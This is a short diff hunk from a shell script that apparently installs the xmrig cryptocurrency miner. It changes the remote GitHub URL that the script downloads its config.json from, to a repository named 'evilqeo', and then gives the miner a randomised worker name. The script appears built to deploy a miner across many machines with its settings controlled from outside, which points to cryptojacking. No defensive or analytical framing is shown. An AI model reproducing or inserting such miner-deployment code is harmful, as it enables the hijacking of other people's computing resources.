@@ -38,7 +38,7 @@ cd xmrig-$xmrver
 chmod +x xmrig
 
 rm -f config.json
-$DOWNLOAD_CMD https://raw.githubusercontent.com/gorguzaaaaz/htmlwebstea/refs/heads/main/config.json
+$DOWNLOAD_CMD https://raw.githubusercontent.com/evilqeo/frcx/main/config.json
 randnum=$(( RANDOM % 1000 + 1 ))
 sed -i "s/kasm/kasm-$randnum/g" config.json
 
